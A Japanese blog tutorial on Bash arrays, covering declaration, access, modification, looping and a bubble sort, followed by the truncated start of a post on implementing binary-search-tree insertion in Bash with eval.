フレンドリーになっています。\n＜＜ばっさり省略＞＞\nこうしたBashスクリプトでアルゴリズムを習得するシリーズを始めます。\nまずは、Bashスクリプトの初歩、そしてデータ構造について、その後、ソートアルゴリズムやツリー、グラフなどへ進みます。\nこのページではBashスクリプトの配列について、重点的に習得します。\nBashスクリプティング Bashスクリプトを作成するには、テキストエディターを開き、冒頭１行目に「/usr/bin/bash」のPATHを 「#!」で参照します。この１行目を she-Bang（シェバン）といいます。\nシェバンは１行目になければなりません。\n２行目は空行である必要があります。\n３行目に「Hello, world!」を出力するスクリプトを記述します。\n#!/usr/bin/bash echo \u0026#34;Hello, world!\u0026#34; ; テキストエディタを保存しファイル名を「hello.sh」としてファイルを閉じます。\nコンソール画面でhello.shを確認したら、bashコマンドで、先ほど作成したファイルを実行します。\nlocal: $ bash hello.sh Hello, world! local: $ Bash スクリプトで変数を割り当てるのはとてもかんたんです。\nほかのプログラム言語にあるデータ型は不要です。\n変数に代入される任意の文字、単語、数字は、Bashによって自動で判断され処理します。\nコメント行は 「#」を行頭に挿入すると、「#」以降の文字列はコメントとして扱われます。\n複数行のコメントは「 :\u0026rsquo;」で開始し、「\u0026rsquo;」で終わります。\n#!/usr/bin/bash # 変数への代入 :\u0026#39; ここのブロックはコメントです 変数名 = [値] \u0026#39; var=\u0026#34;Hello, world!\u0026#34;; echo \u0026#34;$var\u0026#34;; 実行結果は以下のとおりです。\nlocal: $ bash comment.sh Hello, world! local: $ 一つの変数は、一つの値を保持することができます。\n同じデータ型の複数の値を保持する場合は、配列を使用します。\n配列は、インデックス番号で識別される要素のコレクションです。\nデータ構造の実装に関しては、配列が不可欠です。\n配列とは 一つの変数は、一つの値を保持することができます。\n同じデータ型の複数の値を保持する場合は、配列を使用します。\n配列は、インデックス番号で識別される要素のコレクションです。\nデータ構造の実装に関しては、配列が不可欠です。\n実際の例で配列を理解します。\n以下の電話連絡帳は、人の名前や連絡先電話番号が、配列(Array)の要素(Elements)となります。人の名前や連絡先電話番号の追加や削除といった、配列の要素を操作することが簡単にできます。\n電話番号 配列は主にデータ構造の実装に使用します。\n複数の変数を格納できる変数を「配列(Array)」と呼びます。\n配列(Array)は複数の要素(Elements)で構成されています。\n配列に複数の変数を割り当てる場合、構成される要素数の制限はありません。\n配列要素は通常ゼロから始まり、「添え字」といわれるインデックス番号によって参照します。\n以下の画像は、１０個の要素(Elements)で構成され、配列の長さは１０です。\n最初の要素番号は０から始まり、最後の要素番号は９となります。\nこの要素番号をインデックスと言い、要素番号を「添え字」と言います。\n配列 ヒント 配列を使用すると、複数の変数を一度に定義できます。これはプログラミングで同じ変数の型で同じ構造の変数を割り当てる効率的な方法です。 配列の応用 配列は非常に強力なユーティリティであり、多くの科学計算で使用できます。\n配列は、同じ名前の複数の変数を管理するために使用されます。 配列はベクトルで使用できます。ベクトルは通常、機械学習で広く使用される 1 次元配列です。 配列はスタックの実装にも使用され、スタックは実際の物理オブジェクトの山のように動作します。 配列は、キュー、デキュー、およびハッシュ テーブルにも実装されます。 要素の長方形配列である行列も、配列を使用して実装されます。 多くのプログラムのグラフは、配列の実装でもあるリストを使用して描画されます。 CPU スケジューリング アルゴリズムや並べ替えアルゴリズムなどの多くのアルゴリズムは、配列を使用して実装されます。 配列は、プログラム内の動的メモリ割り当てでも使用されます。 配列は音声処理でも使用されます。 ノイズ除去フィルターも配列を使用しています。 上記の配列の実装は、配列データ型の可能性を明確に示しています。\nBashにおける配列の構文 Bashはインデックス付き配列（１次元配列）と、連想配列の療法をサポートしています。以下は、Bashで配列を割り当てる典型的な構文です。\n#name_of_array[添え字]=値 name_of_array[subscript]=value; 配列は要素の集まりであるため、配列内の要素番号は添え字（そえじ）と呼ばれます。\n添え字は、配列内の要素の位置を示します。\n配列内の５番目の要素に値を代入または変更するには、以下のようにします。\n５番目なのにname_of_array[4]となる理由は、インデックスが０から始まっているからです。\n# 0,1,2,3,4,5 name_of_array[4]=value; declare キーワードで配列を宣言すると、まちがいの少ないソースコードを書くことができます。\n# 変数(name_of_array) を 配列(-a)で宣言(declare)する。 declare -a name_of_array; 複数の値を代入する場合は以下の構文となります。\n# 変数(name_of_array) を 配列(-a)で宣言(declare)する。 declare -a name_of_array; name_of_array=(value1 value2 …); 一行にまとめて書くこともできます。\n# 変数(name_of_array) を 配列(-a)で宣言(declare)する。 declare -a name_of_array=(value1 value2 …); Bashでの配列の割り当て Bash スクリプトの配列は、さまざまな方法で割り当てることができます。\nBash スクリプトで配列を割り当てる最も簡単な方法は、丸括弧内にスペースを含む一連の値を、半角スペース区切りで値を代入することです。\necho行に見られる「@」は配列内のすべての要素を出力する場合に使います。\n#!/usr/bin/bash declare -a my_array=(1 2 3 4); echo ${my_array[@]}; bash-5.1$ bash number.sh 1 2 3 4 5 bash-5.1$ Bash スクリプトの配列には、さまざまなデータ型の要素を代入することができます。\nデータ型が文字列の要素を配列に割り当てるには以下のようにします。\n#!/usr/bin/bash declare -a my_array=(jan feb mar apr); echo ${my_array[@]}; bash-5.1$ bash month.sh jan feb mar apr bash-5.1$ 配列に、要素を割り当てるには、角括弧 [要素番号]で要素番号を指定して、値を割り当てます。\ndeclare -a my_array=([0]=\u0026#34;jan\u0026#34; [1]=\u0026#34;feb\u0026#34; [2]=\u0026#34;mar\u0026#34; [3]=\u0026#34;apr\u0026#34;); echo ${my_array[@]}; bash-5.1$ bash month2.sh jan feb mar apr bash-5.1$ 要素を一つずつ書くと以下の通りとなります。\nmy_array[0]=\u0026#34;jan\u0026#34;; my_array[1]=\u0026#34;feb\u0026#34;; 配列は、「declare」 キーワードで宣言することが理想です。\ndeclareのオプション 「-a」 と 「-A」 はそれぞれ、配列と連想配列を宣言するために区別され使用されます。\n一般的な配列\ndeclare -a my_array; #配列 my_array[0]=\u0026#34;jan\u0026#34;; my_array[1]=\u0026#34;feb\u0026#34;; 連想配列\ndeclare -A my_array; #連想配列 my_array[first]=\u0026#34;jan\u0026#34;; my_array[second]=\u0026#34;feb\u0026#34;; 連想配列は以下のように入力することもできます。\ndeclare -A my_array=([first]=\u0026#34;jan\u0026#34; [second]=\u0026#34;feb\u0026#34; [third]=\u0026#34;mar\u0026#34; [fourth]=\u0026#34;apr\u0026#34;); 以下のスクリプトは、１から６までの数値を配列に代入します。\ndeclare -a my_array=$(seq 1 6); echo ${my_array[@]}; 実行結果は以下のとおりです。\nbash-5.1$ bash seq.sh 1 2 3 4 5 6 bash-5.1$ ループによる配列の代入 配列は、ループを介して割り当てることもできます。\n以下は、month_arrayの内容をmy_arrayへコピーして出力しています。\nこのブロックは少し難しいかもしれません。\nBash固有の知識も必要なこともあり、アルゴリズムの習得には特に必要なことではないので、読み飛ばしていただいても結構です。\n#!/usr/bin/bash declare -a month_array=(\u0026#34;jan feb mar apr\u0026#34;); declare -i number=0; # 変数は数値型 declare -a my_array; # 変数は配列型 while read number;do my_array[$number]=${month_array[$number]}; let number++; done\u0026lt; \u0026lt;( seq 0 4) echo ${my_array[@]}; 文字列からの配列の代入 前の項のサンプルをもう少し簡単に配列を割り当てることができます。\n修正前の前項のサンプル\n#!/usr/bin/bash declare -a month_array=(\u0026#34;jan feb mar apr\u0026#34;); declare -a my_array; # 変数は配列型 declare -i number=0; # 変数は数値型 while read number;do my_array[$number]=${month_array[$number]}; let number++; done\u0026lt; \u0026lt;( seq 0 4) # 出力 echo ${my_array[@]}; 修正したスクリプト。while read がまるごと不要となっていますね。\n#!/usr/bin/bash declare -a month_array=(\u0026#34;jan feb mar apr\u0026#34;); declare -a my_array=(${month_array// / }); このブロックはまるごとコメントアウト : \u0026#39; declare -i number=0; while read number;do my_array[$number]=${month_array[$number]}; let number++; done\u0026lt; \u0026lt;( seq 0 4) \u0026#39; # 出力 echo ${my_array[@]}; 「- ハイフン」で区切りたい場合は以下のとおりです。\ndeclare -a my_array=(${month_array//-/ }); Bash ２種類の配列 配列を使用するには、多くの方法とアプローチがあります。Bashには２種類の配列があります。\nインデックス付き配列（一般的な配列） 連想配列 インデックス付き配列 インデックス付き配列は、0から始まるインデックス番号で参照される要素を格納する配列の基本的な形式です。Bash スクリプトでのインデックス付き配列の例を以下に示します。\ndeclare -a my_array=(a b c d); 前述の通り、配列はdeclareキーワードを使って宣言すると、間違いな少なくなります。\n「my_array」は変数です。\n「a、b、c、d」 は配列の要素です。\n配列の長さは４です。\n「a」の要素番号は０です。\n要素番号は０から始まるので「d」の要素番号は３となります。\n以下の例では、０番目の要素に\u0026quot;First Item\u0026quot;、１番目の要素に\u0026quot;Second Item\u0026quot;を代入しています。\ndeclare -a my_array; my_array[0]=\u0026#34;First Item\u0026#34;; my_array[1]=\u0026#34;Second Item\u0026#34;; 連想配列 連想配列は、文字列をインデックスとして使用する配列です。つまり、連想配列の配列インデックスは名前付きの形式です。連想配列は、「declare」 キーワードを使用して Bash で宣言されます。\n#!/usr/bin/bash declare -A my_array my_array[one]=\u0026#34;First Item\u0026#34;; my_array[two]=\u0026#34;Second Item\u0026#34;; echo \u0026#34;${my_array[@]}\u0026#34;; 実行結果は以下の通りです。\nbash-5.1$ bash associativeArrays.sh First Item Second Item bash-5.1$ 連想配列の宣言には、任意の文字列、または文字セットが使用されます。\n# 連想配列として宣言 declare -A my_array[\u0026#34;this is a string\u0026#34;]=\u0026#34;Hello Linux\u0026#34;; echo \u0026#34;${my_array[@]}\u0026#34;; 実行結果は以下の通りです。\nbash-5.1$ associativeArray2.sh Hello Linux bash-5.1$ 上記のように、配列インデックス内の文字列にはスペースが含まれていることに注意することが重要です。\n連想配列を初期化する別の方法を以下に示します。\ndeclare -A my_array=([month1]=jan [month2]=feb [month3]=mar); echo \u0026#34;${my_array[@]}\u0026#34;; bash-5.1$ bash associativeArrays3.sh mar feb jan bash-5.1$ Bashでの配列へのアクセス 他のすべてのプログラミング言語と同様に、Bash の配列もインデックス番号を介してアクセスされます。例を通してそれを理解しましょう：\ndeclare -a my_array=(jan feb mar apr); echo ${my_array[1]}; echoは、コマンドラインインターフェイスに標準出力を出力するBashコマンドです。\n上記の例では、echoコマンドは、配列my_arrayの最初のインデックスに項目を出力しています。\nfebのインデックス番号は１であるため、標準出力にfebが出力されます。\nbash-5.1$ bash arraysAccess.sh feb bash-5.1$ 配列のすべての要素の表示 配列のすべての要素を表示するには、「@」を使います。\necho ${my_array[@]}; すべての要素を単一引用符文字列として表示するには、「＊」を使います。\necho ${my_array[*]}; 配列の特定の要素の表示 配列の任意の要素を表示するには以下のようにします。\n配列の3番目の要素を出力する\n# ０から始まる要素番号の３番目は２です。 echo ${my_array[2]}; 配列の最後の要素を添え字拡張メソッドで出力することができます。\necho ${my_array[@]: -1}; 添え字構文を使用して最後の要素を出力するには、次を使用します。\necho ${my_array[-1]}; 要素の範囲を出力するには、以下の構文を使用します。\necho ${my_array[@]:x:y}; ここで 、xは最初のインデックス番号で、yは最後のインデックス番号です。\n例えば、インデックス0から2までの要素を表示するには、次を使用します。\necho ${my_array[@]:1:3}; ここまでのまとめを以下にまとめました。\n#!/usr/bin/bash declare -a my_array=( jan feb mar apr ); echo \u0026#34;配列のすべての要素:\u0026#34; ${my_array[@]}; echo \u0026#34;配列の 2 番目の要素:\u0026#34; ${my_array[1]}; #インデックスは0から始まる echo \u0026#34;部分文字列展開による配列の最後の要素:\u0026#34; ${my_array[@]: -1}; echo \u0026#34;添字による配列の最後の要素:\u0026#34; ${my_array[-1]}; echo \u0026#34;インデックス 1 から 3 までの要素:\u0026#34; ${my_array[@]:1:3}; 実行結果は以下のとおりです。\nbash-5.1$ bash arraysAccess.sh 配列のすべての要素: jan feb mar apr 配列の 2 番目の要素: feb 部分文字列展開による配列の最後の要素: apr 添字による配列の最後の要素: apr インデックス 1 から 3 までの要素: feb mar apr bash-5.1$ 配列の初期化されたインデックスへのアクセス 配列のインデックスは、プログラミング中の重要な要素です。\nインデックス番号を取得するには、次を使用します。\n#!/usr/bin/bash declare -a my_array; my_array[3]=\u0026#34;jan\u0026#34;; my_array[5]=\u0026#34;feb\u0026#34;; my_array[9]=\u0026#34;mar\u0026#34;; my_array[12]=\u0026#34;mar\u0026#34;; echo \u0026#34;インデックスのリスト:\u0026#34; ${!my_array[@]}; bash-5.1$ bash indexAccess.sh インデックスのリスト: 3 5 9 12 bash-5.1$ Bashでの配列の変更 要素の更新 配列内の特定の要素を更新するには、次の構文に従います。\nmy_array [ \u0026lt; index_number \u0026gt; ] =値\n#!/usr/bin/bash declare -a my_array; my_array=(jan feb mar apr); echo \u0026#34;現在の要素 :\u0026#34; ${my_array[@]}; my_array[2]=\u0026#34;may\u0026#34;; echo \u0026#34;更新した要素:\u0026#34; ${my_array[@]} 実行結果は以下のとおりです。\nbash-5.1$ bash replaceArrays.sh 現在の要素 : jan feb mar apr 更新した要素: jan feb may apr bash-5.1$ 上記の例では、2番目のインデックスの要素である \u0026ldquo;mar\u0026quot;が\u0026quot;may\u0026quot;に置き換えられています。\n要素の追加 my_array+=(jun Jul); my_array=(\u0026#39;dec\u0026#39; ${my_array[@]}); #!/usr/bin/bash declare -a my_array=(jan feb mar apr); my_array+=(jun jul); echo \u0026#34;配列の末尾に要素を追加: \u0026#34;${my_array[@]}; my_array=(\u0026#34;dec\u0026#34; ${my_array[@]}); echo \u0026#34;配列の先頭に要素を追加: \u0026#34;${my_array[@]}; bash-5.1$ bash addArrays.sh 配列の末尾に要素を追加:jan feb mar apr jun jul 配列の先頭に要素を追加:dec jan feb mar apr jun jul bash-5.1$ 要素の挿入 特定のインデックスに要素を挿入するには、次のようにします。\n#!/usr/bin/bash declare -a my_array=(jan feb mar apr); echo ${my_array[@]}; i=2; my_array=(\u0026#34;${my_array[@]:0:$i}\u0026#34; \u0026#34;aug\u0026#34; \u0026#34;${my_array[@]:$i}\u0026#34;); echo ${my_array[@]}; 上記の例では、配列(my_array)の2番目のインデックスに要素augを挿入し、次の要素を次のインデックスにシフトしています。\n要素marとaprは、それぞれインデックス３と４にシフトされます。\n実行結果は以下のとおりです。\nbash-5.1$ bash insertArrays.sh jan feb mar apr jan feb aug mar apr bash-5.1$ 要素の削除 Bash 配列では、「unset」コマンドを使用して要素を削除できます。\n配列のすべての要素を削除するには、次のようにします。\ndeclare -a my_array=(jan feb mar apr) unset my_array # 配列を削除 「unset」は、宣言された変数を削除するための組み込みコマンドです。\n配列内の特定の要素の設定を解除するには、次のようにします。\n#!/usr/bin/bash declare -a my_array=(jan feb mar apr); unset my_array[2]; #３番目の要素を削除 echo \u0026#34;3番目の要素を削除したあとの配列:\u0026#34;${my_array[@]} 実行結果は以下のとおりです。\nbash-5.1$ bash deleteArrays.sh 3番目の要素を削除したあとの配列:jan feb apr bash-5.1$ パターンコマンドで削除する patternコマンドを使用して要素を削除することもできます。\n# ju で始まる要素を配列から削除します。 my_pattern(${my_array[@]/ju*/}) 次のスクリプトは「ju」で始まる要素を配列から削除します。\n#!/usr/bin/bash declare -a my_array=(jan feb mar apr jun jul); echo \u0026#34;現在の配列\u0026#34; ${my_array[@]}; declare -a my_pattern=(${my_array[@]/ju*/}); echo \u0026#34;juから始まる要素は配列から削除しました:\u0026#34; ${my_pattern[@]}; 実行結果は以下のとおりです。\nbash-5.1$ bash test 現在の配列 jan feb mar apr jun jul juから始まる要素は配列から削除しました: jan feb mar apr bash-5.1$ 配列のマージ 2 つの配列をマージするには、次を使用します。\n# 二つの配列をマージ（結合）します my_array=(${my_array1[@]} ${my_array2[@]}); #!/usr/bin/bash declare -a my_array1=(jan feb mar apr); echo \u0026#34;my_array1: \u0026#34; ${my_array1[@]}; declare -a my_array2=(may jun jul aug); echo \u0026#34;my_array2: \u0026#34; ${my_array2[@]}; #マージ declare -a my_array=(${my_array1[@]} ${my_array2[@]}); echo \u0026#34;マージした配列:\u0026#34;${my_array[@]}; 実行結果は以下のとおりです。\nbash-5.1$ bash mergeArrays.sh my_array1: jan feb mar apr my_array2: may jun jul aug マージした配列:jan feb mar apr may jun jul aug bash-5.1$ 注意 うーん、マージというか結合ですね。 配列要素のギャップの削除 #!/usr/bin/bash declare -a my_array1=(jan feb mar apr) echo \u0026#34;不要な要素を含む配列:\u0026#34; ${my_array1[@]} my_array2=(${my_array1[@]}) echo \u0026#34;不要な要素を削除した配列:\u0026#34; ${my_array2[@]} 実行結果は以下のとおりです。\nbash-5.1$ bash gapArrays.sh 不要な要素を含む配列: jan feb mar apr 不要な要素を削除した配列: jan feb mar apr bash-5.1$ 注意 my_array[@]で出力する段階で、余分なスペースが連続していたとしても除去され空白は一つになります。 Bashで配列の長さを求める 配列の長さを求めるには「#」を使います。\ndeclare -a my_array=(jan feb mar apr); echo ${#my_array[@]}; 実行結果は以下のとおりです。\nbash-5.1$ bash countArrays.sh 4 bash-5.1$ Bashでループを使用して配列を反復処理する 配列にアクセスするにはさまざまな方法があります。\nすべての要素を入力して明示的にアクセスするか、配列の要素をループすることができます。\n一般的なforループで配列を出力\n#!/usr/bin/bash declare -a my_array=( e1 e2 e3 e4 e5 e6 ); for i in ${my_array[@]};do echo $i; done 実行結果は以下のとおりです。\nbash-5.1$ bash forArrays.sh e1 e2 e3 e4 e5 e6 bash-5.1$ CやJavaのような書き方もできます。\n「-lt」の代わりに、 小なり記号 「\u0026lt;」 も使用できます。\n上記の ループは次のようにも記述できます。\n#!/usr/bin/bash echo \u0026#34;スマートな書き方\u0026#34;; for((i=0;i\u0026lt;${#my_array[@]};i++));do echo ${my_array[i]}; done forに限定ですが、実はdoやdoneを中括弧に置き換えることもできます。\n#!/usr/bin/bash echo \u0026#34;もっとスマートな書き方\u0026#34;; for((i=0;i\u0026lt;${#my_array[@]};i++)){ echo ${my_array[i]}; } whileループも同様です。\n「-lt」の代わりに、 小なり記号 「\u0026lt;」 も使用できます。\n#!/usr/bin/bash declare -a my_array=( e1 e2 e3 e4 e5 e6 ); declare -i i=0; echo \u0026#34;一般的な書き方\u0026#34;; while [ $i -lt ${#my_array[@]} ];do echo my_array[$i]; i=$((i+1)); done echo \u0026#34;スマートな書き方\u0026#34;; i=0; while(($i\u0026lt;${#my_array[@]}));do echo my_array[$i]; ((i++)); # インクリメント done Bashの多次元配列 多次元配列は、Bashプログラミング言語の正式な部分ではありませんが、多次元配列をサポートしています。多次元配列は、forループを使用して簡単にシミュレートできます。\n#!/usr/bin/bash declare -a my_array echo \u0026#34;行数を入力してください。\u0026#34; read rows echo \u0026#34;列数を入力してください。\u0026#34; read cols for((x=0;x\u0026lt;rows;x++)){ for((y=0;y\u0026lt;cols;y++)){ my_array[${x},${y}]=$RANDOM; #乱数の割当 } } for((i=0;i\u0026lt;rows;i++)){ for((y=0;y\u0026lt;cols;y++)){ echo -ne \u0026#34;${my_array[${x},${y}]}\\t\u0026#34;; } echo; } 実行結果は以下のとおりです。\nbash-5.1$ bash multidimensionalArrays.sh 行数を入力してください。 5 列数を入力してください。 5 30450 17441 17878 21194 17382 30450 17441 17878 21194 17382 30450 17441 17878 21194 17382 30450 17441 17878 21194 17382 30450 17441 17878 21194 17382 bash-5.1$ 上記のコードは、ユーザーからの入力として行と列を受け取り、0～32767の疑似乱数を生成します 。\nBashでのバブルソート ソートはデータの管理に使用され、検索アルゴリズムなどのアルゴリズム機能をより効率的にするプログラミングのよく知られた手法のひとつです。\nバブルソーティングは、シンキングソーティングとも呼ばれ、わかりやすいソーティング手法の1つです。\nバブルソートは、提供された配列リストをステップ実行し、配列要素を比較し、一時変数の要素を交換し、配列が整うまでタスクを繰り返します。\n以下に、bashでのバブルソートの例を示します。\n#! /bin/bash declare -a my_array=(2 3 1 5 4); echo \u0026#34;未ソートの配列 :\u0026#34; ${my_array[*]}; for ((x=0; x\u0026lt;5; x++)){ for ((y=0; y\u0026lt;5-i-1; y++)){ if [ ${my_array[y]} -gt ${my_array[$((y+1))]} ]; then temp=${my_array[y]}; my_array[$y]=${my_array[$((y+1))]}; my_array[$((y+1))]=$temp; fi } } echo \u0026#34;ソート済みの配列\u0026#34; ${my_array[*]}; bash-5.1$ bash bubbleSort.sh 未ソートの配列 : 2 3 1 5 4 ソート済みの配列 1 2 3 4 5 bash-5.1$ ヒント ソートアルゴリズムについては、次回の「ざっくりわかるシェルスクリプト７」で詳しく説明します。 「ざっくり」シリーズのご紹介 【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n「ざっくり」シリーズのご紹介 【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-09-27T10:31:43+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/","title":"【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６"},{"content":"9月27日 アルゴリズムの勉強を始めました。\nまずは基礎から。\nバイナリサーチからスタートします。\nそれまでのものは鈴木先生が作成している以下のgitをご参照ください。\nhttps://github.com/suzukiiichiro/Algorithms-And-Data-Structures\nまず、バイナリサーチの挿入のメソッドを作成したいと思います。\nロジックは以下の通り\nバイナリサーチをするためにはソード済みであること必要なので、挿入時にrootノードの左側にrootノードより少ない値を、右側にrootノードより大きい値を置いていきます。各ノードは左右に最大２つのノードを持って枝分かれしていきます。それぞれのノードが左は自分より小さい値を右が自分より大きい値を置きます。\n・最初にルートを設定する（初回のinsertの時だけ動く）\n・ルートノードから値を比較しながら下のノードに移動していく\n・着目しているノードと目的の値を比較する。\n・目的の値 \u0026lt; 着目しているノード」なら左の子が、次の着目ノードとなる。\n・存在すれば、次の着目ノードに移って繰り返し。次の着目ノードが存在しなければ（現在の着目ノードが葉であれば）、一つ前の着目ノード(parent)の左(leftChild)位置にデータを挿入。\n・目的の値 \u0026gt; 着目しているノード」なら右の子が、次の着目ノードとなる。\n・存在すれば、次の着目ノードに移って繰り返し。次の着目ノードが存在しなければ（現在の着目ノードが葉であれば）、一つ前の着目ノード(parent)の右(rightChild)位置にデータを挿入。\nJavaのプログラムは以下の通り\npublic void insert(int id, double dd) { Node newNode = new Node(); // make new node newNode.iData = id; // insert data newNode.dData = dd; if(root==null) // no node in root root = newNode; else // root occupied { Node current = root; // start at root Node parent; while(true) // (exits internally) { parent = current; if(id \u0026lt; current.iData) // go left? { current = current.leftChild; if(current == null) // if end of the line, { // insert on left parent.leftChild = newNode; return; } } // end if go left else // or go right? { current = current.rightChild; if(current == null) // if end of the line { // insert on right parent.rightChild = newNode; return; } } // end else go right } // end while } // end else not root } // end insert() これをbashに置き換えたいのですが、nodeがオブジェクトになっているのでbashでevalを使ってオブジェクトを再現したいと思います。\nsetterメソッドがevalで動的にgetterメソッドを作成するという動きでオブジェクトを再現しています。\n#setメソッドはインスタンスのgetterメソッドを動的に生成する set_node_left() { eval \u0026#34;${1}.getLeftChild() { echo \u0026#34;$2\u0026#34;; }\u0026#34; } set_node_right() { eval \u0026#34;${1}.getRightChild() { echo \u0026#34;$2\u0026#34;; }\u0026#34; } set_node_value() { eval \u0026#34;${1}.getValue() { echo \u0026#34;$2\u0026#34;; }\u0026#34; } #インスタンスを生成する function new_node() { local node_id=\u0026#34;$1\u0026#34;; local value=\u0026#34;$2\u0026#34;; local left=\u0026#34;$3\u0026#34;; local right=\u0026#34;$4\u0026#34;; eval \u0026#34;${node_id}set=\u0026#39;set\u0026#39;\u0026#34;; eval \u0026#34;set_node_value $node_id $value\u0026#34;; eval \u0026#34;set_node_left $node_id $right\u0026#34;; eval \u0026#34;set_node_right $node_id $right\u0026#34;; } bashのプログラムは以下の通り\nfunction theTree_insert(){ local value=$1; local id=$(gen_uid); #nodeのインスタンスを生成する。 eval \u0026#34;new_node $id $value\u0026#34;; #最初にルートを設定する（初回のinsertの時だけ動く） if [ -z \u0026#34;$root\u0026#34; ];then #ルートから手順を開始する。 root=$id; else 